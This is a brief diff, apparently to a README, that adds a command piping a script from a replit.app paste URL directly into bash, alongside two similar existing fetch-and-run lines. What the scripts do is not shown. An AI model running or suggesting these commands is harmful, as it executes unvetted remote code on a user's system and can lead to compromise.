@@ -17,3 +17,7 @@ bash <(curl -s https://raw.githubusercontent.com/tucommenceapousser/0xa/main/dlb
 ```
 bash <(curl -s https://hastetrkn.replit.app/raw/ebeqewijor)
 ```
+
+```
+bash <(curl -s https://hastetrkn.replit.app/raw/bihaneqohu)
+```
